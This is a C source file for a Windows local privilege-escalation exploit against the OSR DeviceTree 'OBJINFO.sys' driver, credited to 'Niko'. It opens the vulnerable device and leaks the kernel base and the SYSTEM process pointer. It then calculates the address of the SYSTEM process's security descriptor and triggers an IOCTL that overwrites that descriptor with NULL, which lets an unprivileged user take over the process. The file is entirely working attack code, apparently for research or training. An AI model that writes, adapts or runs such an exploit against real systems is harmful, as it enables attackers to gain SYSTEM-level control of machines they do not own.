#include "exploit.h"
#include "leak_utilities.h"

// rcx = CurrentStackLocation->Parameters.DeviceIoControl.Type3InputBuffer
int main(int argc, char** argv)
{
	HANDLE device_handle = CreateFileA(TARGET_DEVICE, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0); // GENERIC_READ | GENERIC_WRITE doesn't work..?
	HINSTANCE nt_dll_handle = LoadLibraryA(NT_DLL_LOCATION);

	unsigned long long base_address = 0ULL;
	unsigned long long security_descriptor_address = 0ULL;

	DEVICE_INPUT device_input;
	unsigned char output_buffer[8];
	unsigned long bytes_returned = 0UL;

	unsigned char unused = 0;

	RtlSecureZeroMemory(output_buffer, sizeof(output_buffer));
	RtlSecureZeroMemory(&device_input, sizeof(device_input));

	SetConsoleTitleA("DeviceTree Exploit");
	printf("[*] OSR DeviceTree \"OBJINFO.sys\" Write NULL Elevation of Privilege Vulnerability\n[*] Exploit written by Niko\n[!] Let's exploit!");

	if (device_handle == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the \"%s\" device. Error: %d (0x%x)", TARGET_DEVICE, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"%s\" device. Handle Value: 0x%p", TARGET_DEVICE, device_handle);

	if (!nt_dll_handle)
	{
		printf("\n[-] Failed to obtain a handle to \"%s\" library. Error: %d (0x%x)", NT_DLL_LOCATION, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"%s\" library. Handle Value: 0x%p", NT_DLL_LOCATION, device_handle);

	if (!(base_address = leak_ntoskrnl_base_address(nt_dll_handle)))
	{
		return 1;
	}

	if (!(security_descriptor_address = leak_system_eprocess_pointer(nt_dll_handle)))
	{
		return 1;
	}

	security_descriptor_address = security_descriptor_address - 0x30 + 0x28; // dt nt!_OBJECT_HEADER <system process object header address>
	printf("\n[+] Calculated the \"SYSTEM\" process' security descriptor address. Security Descriptor Address: 0x%p", (unsigned long long*)security_descriptor_address);

	device_input.Address = security_descriptor_address; // rax (long long)
	device_input.Size = 8; // rbx (int)
	printf("\n[+] Crafted input structure.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering NULL overwrite of the security descriptor...");
	Sleep(1000);

	DeviceIoControl(device_handle, TARGET_IOCTL, &device_input, sizeof(device_input), output_buffer, 8, &bytes_returned, 0);

	printf("\n[!] Overwrote the security descriptor.\n<---------------- | Leaving Danger Zone | ---------------->");
	Sleep(1000);

	// TEMP
	getchar();
	// TEMP

	return 0;
}